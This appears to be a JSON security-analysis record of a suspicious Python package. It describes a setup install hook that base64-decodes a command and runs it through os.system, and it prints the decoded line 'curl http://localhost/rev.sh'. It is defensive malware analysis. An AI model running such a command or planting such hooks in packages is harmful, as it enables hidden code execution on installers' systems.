{
  "purpose": "The code defines a setup configuration for a Python package, with hooks that execute code during installation and development.",
  "sources": "The base64-encoded string in the notmalfunc() function, which is decoded and executed to make a system call.",
  "sinks": "The os.system call that executes decoded code, potentially connecting to external resources.",
  "flows": "The encoded string is decoded in b64d(), then passed to os.system, which executes it as a shell command.",
  "anomalies": "Use of base64 encoding for the command, obfuscating its intent; execution of decoded code via os.system; the URL indicates malicious intent; the package description suggests malicious demonstration.",
  "analysis": "The script imports standard setup tools, defines a base64 decoding function, and a function notmalfunc() that decodes a base64 string. The decoded string is 'curl http://localhost/rev.sh', which is a command to fetch and potentially execute a script from localhost. During installation (via AfterInstall class), notmalfunc() is invoked, executing the system command. This behavior indicates an attempt to run remote or local code, potentially malicious, especially given the context of the package description and the URL. The use of obfuscation and execution of decoded code are suspicious. The URL points to a malicious demonstration repository, reinforcing malicious intent. Overall, the code is designed to execute a command that fetches a script from localhost, which could be used for malicious purposes.",
  "conclusion": "This package contains obfuscated code that executes a shell command decoded from base64, which attempts to fetch a script from localhost. This behavior is suspicious and indicative of malicious intent, possibly to execute arbitrary code during installation. The package's description and URL further suggest malicious purpose.",
